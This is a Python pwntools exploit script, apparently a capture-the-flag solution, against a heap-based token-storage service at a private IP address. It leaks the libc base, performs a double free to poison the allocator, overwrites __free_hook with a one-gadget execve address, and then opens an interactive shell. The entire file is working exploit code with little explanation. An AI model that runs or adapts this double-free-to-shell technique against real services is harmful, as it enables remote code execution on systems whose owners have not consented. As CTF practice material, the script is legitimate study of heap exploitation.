#from pwn import *
from pwn import *
import os
import sys
import time

#context.log_level = 'debug'
conn = remote('10.21.232.3',20202)
libc = ELF('./libc.so.6')
# elf = ELF('./sectok_libc')


# conn=process('./sectok_libc',{"LD_PRELOAD":libc.path}) 
# gdb.attach(conn)

def add():
    conn.recvuntil(b'Action: ')
    conn.sendline(b'g')
    conn.recvuntil(b'token: ')
    conn.sendline(b'ABCD')

def exit():
    conn.recvuntil(b'Action: ')
    conn.sendline(b'x') 


def remove(i):
    conn.recvuntil(b'Action: ')
    conn.sendline(b'd')
    conn.recvuntil(b'token: ')
    conn.sendline(f'{i}'.encode())





conn.recvuntil(b'base: ')

libc_address = conn.recvuntil(b'\n').decode()
libc_address = libc_address.replace('\n', '').strip()
libc_base = int(libc_address,16)


__free_hook = libc_base + libc.symbols["__free_hook"]
__malloc_hook = libc_base + libc.symbols["__malloc_hook"]
execve1 = libc_base + int(0x10a2fc)
execve2 = libc_base + int(0x4f29e)
execve3 = libc_base + int(0x4f2a5)
execve4 = libc_base + int(0x4f302)

log.info("libc base = "+libc_address)
log.info("execve = "+ str(hex(execve4)))
log.info("free_hook = "+str(hex(__free_hook)))



for i in range(9):
    add()

for i in range(7):
    remove(i)

remove(7)
remove(8)
remove(7)



for i in range(7):
    add()



conn.recvuntil(b'Action: ')
conn.sendline(b'g')
conn.recvuntil(b'token: ')
conn.sendline(p64(__free_hook))



add()
add()

conn.recvuntil(b'Action: ')
conn.sendline(b'g')
conn.recvuntil(b'token: ')
conn.sendline(p64(execve4))



remove(1)
# conn.recvuntil(b'Action: ')
# conn.sendline(b'd')
# conn.recvuntil(b'token: ')
# conn.sendline(b'/bin/sh')



# # this binsh function i have to call using double free exploit
# # log.info('shell add ' + hex(shell))
# conn.recvuntil(b'Action: ')
# conn.sendline(b'g')
# conn.recvuntil(b'token: ')
# conn.sendline(p64(shell))
# log.info('shell add ' + hex(shell))






# conn.recvuntil(b'Action: ')
# conn.sendline(b'x') 

conn.interactive()


